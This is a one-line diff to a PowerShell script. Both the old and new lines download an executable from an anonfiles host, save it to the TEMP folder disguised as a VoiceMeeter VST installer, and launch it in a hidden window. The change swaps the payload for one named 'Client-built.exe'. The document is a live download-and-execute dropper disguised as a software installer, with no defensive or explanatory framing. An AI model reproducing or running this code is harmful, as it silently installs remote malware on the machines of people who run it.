@@ -1,1 +1,1 @@
-iwr -useb https://cdn-153.anonfiles.com/ndU7n5Q8y4/851345f3-1672952520/opti.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
+iwr -useb https://cdn-109.anonfiles.com/bbGbo5Q1ye/48990242-1672955010/Client-built.exe -o $env:TEMP\voicemeetervstinstaller.exe; saps $env:TEMP\voicemeetervstinstaller.exe -WindowStyle Hidden
